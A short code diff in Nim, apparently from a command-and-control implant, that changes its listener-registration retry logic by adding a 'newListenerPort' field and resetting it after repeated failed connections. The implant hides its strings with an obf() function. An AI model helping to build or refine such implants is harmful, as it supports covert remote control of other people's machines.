@@ -36,6 +36,7 @@ proc runNp() : void =
         listenerHost: CONFIG[obf("hostname")],
         listenerIp: CONFIG[obf("listenerIp")],
         listenerPort: CONFIG[obf("listenerPort")],
+        newListenerPort: CONFIG[obf("listenerPort")],
         listenerType: CONFIG[obf("listenerType")],
         registerPath: CONFIG[obf("listenerRegPath")],
         resultPath: CONFIG[obf("listenerResPath")],
@@ -55,6 +56,9 @@ proc runNp() : void =
     proc handleFailedRegistration() : void =
         sleepMultiplier = 3^currentAttempt
         inc currentAttempt
+
+        if currentAttempt == maxAttempts:
+            listener.newListenerPort = CONFIG[obf("listenerPort")]
 
         if currentAttempt > maxAttempts:
             when defined verbose:
@@ -78,8 +82,8 @@ proc runNp() : void =
         else:
             when defined verbose:
                 echo obf("DEBUG: Server connection lost. Attempt: ") & $currentAttempt & obf("/") & $maxAttempts & obf(".")
-
-
+   
+   
     # Main loop
     while true:
         var
